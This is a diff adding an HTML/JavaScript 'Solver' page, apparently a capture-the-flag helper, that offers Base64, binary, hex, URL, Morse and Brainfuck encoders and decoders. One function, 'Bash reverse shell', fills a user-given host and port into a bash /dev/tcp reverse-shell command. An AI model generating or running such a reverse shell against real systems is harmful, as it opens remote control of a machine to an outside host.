@@ -1,0 +1,111 @@
+<!-- Author: Alamot -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+#copybutton {
+  display: inline-block;
+  margin: 10px;
+}
+
+#input {
+  display: block;
+}
+
+#result {
+  background-color: yellow;
+  border: 1px solid black;
+  display: none;
+  padding: 10px;
+  word-break: break-all;
+  white-space: normal;
+}
+</style>
+<title>Solver</title>
+</head>
+<body>
+
+<textarea id="input" name="text" cols="60" rows="5" placeholder="Type something..." autofocus required></textarea>
+<datalist id="functions" onchange="myFunction()">
+  <option value="Base64 encoding">
+  <option value="Base64 decoding">
+  <option value="Binary encoding">
+  <option value="Binary decoding">
+  <option value="Decimal ASCII encoding">
+  <option value="Decimal ASCII decoding">
+  <option value="Brainfuck interpreter">
+  <option value="UTF-8 hex encoding">
+  <option value="UTF-8 hex decoding">
+  <option value="URL encoding (minimum)">
+  <option value="URL encoding (medium)">
+  <option value="URL decoding">
+  <option value="Morse code encoding">
+  <option value="Morse code decoding">
+  <option value="Bash reverse shell">
+</datalist>
+<input id="function" type="text" list="functions" placeholder="Select function...">
+<button id="copybutton" onclick="window.getSelection().selectAllChildren(document.getElementById('result')); document.execCommand('copy'); setTimeout(function () { window.getSelection().empty() }, 500);">Copy result to clipboard</button>
+<pre id="result"></pre>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script src="js/function.brainfuck.js"></script>
+<script src="js/morsecode.js"></script>
+
+<script>
+$(function () {
+  var functions = {};
+  functions["Base64 encoding"] = function (input) { return btoa(input); }
+  functions["Base64 decoding"] = function (input) { return atob(input); }
+  functions["Binary encoding"] = function (input) { output = ""; for (i = 0; i < input.length; i++) { var e = input[i].charCodeAt(0); var s = ""; do { var a = e % 2; e = (e-a)/2; s = a+s; } while(e != 0); while(s.length < 8) { s = "0" + s;} output += s; } return output; }
+  functions["Binary decoding"] = function (input) { return input.replace(/[01]{8}/g, function(v){ return String.fromCharCode(parseInt(v, 2)); }); }
+  functions["Decimal ASCII encoding"] = function (input) { function ascii_enc (a) { return a.charCodeAt(0); } return input.split('').map(ascii_enc); }
+  functions["Decimal ASCII decoding"] = function (input) { function ascii_dec (a) { return String.fromCharCode(a); } return input.split(',').map(ascii_dec).join(''); }
+  functions["UTF-8 hex encoding"] = function (input) { return unescape(encodeURIComponent(input)).split('').map(function(v){ return v.charCodeAt(0).toString(16); }).join(''); }
+  functions["UTF-8 hex decoding"] = function (input) { return decodeURIComponent(input.replace(/(..)/g,'%$1')); }
+  functions["URL encoding (minimum)"] = function (input) { return encodeURI(input); }
+  functions["URL encoding (medium)"] = function (input) { return encodeURIComponent(input); }
+  functions["URL decoding"] = function (input) { return decodeURIComponent(input); }
+  functions["Brainfuck interpreter"] = function (input) { return brainfuck(input); }
+  functions["Morse code encoding"] = function (input) { return MorseCode.encode(input); }
+  functions["Morse code decoding"] = function (input) { return MorseCode.decode(input); }
+  function shell(input, code) { var args = input.split(':'); if (args[0] && args[1]) { return code.replace("LHOST", args[0]).replace("LPORT", args[1]); } else { return code; } }
+  functions["Bash reverse shell"] = function (input) { return shell(input, "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"); }
+
+  $('input:text').focus(function(){ $(this).val(''); });
+  $('input:text').click(function(){$(this).val(''); });
+
+  $("#input").on('input', function () {
+    var f = $("#function").val();
+    if($("#functions option[value='" + f + "']").length == 0) { $('#result').css("background-color", "red"); $('#result').text("Please select a valid function"); return; }
+    var input = $("#input").val();
+    try {
+      var result = functions[f](input);
+      $('#result').css("background-color", "yellow");
+    } catch(err) {
+      var result = err.message;
+      $('#result').css("background-color", "red");
+    }
+    $('#result').text(result);
+    $('#result').css("display", "table");
+    
+  });
+
+  $("#function").on('change', function () {
+    var f = this.value;
+    if($("#functions option[value='" + f + "']").length == 0) { $('#result').css("background-color", "red"); $('#result').text("Please select a valid function"); return; }
+    var input = $("#input").val();
+    try {
+      var result = functions[f](input);
+      $('#result').css("background-color", "yellow");
+    } catch(err) {
+      var result = err.message;
+      $('#result').css("background-color", "red");
+    }
+    $('#result').text(result);
+    $('#result').css("display", "table");
+  });
+});
+</script>
+</html>
+<!-- Author: Alamot -->
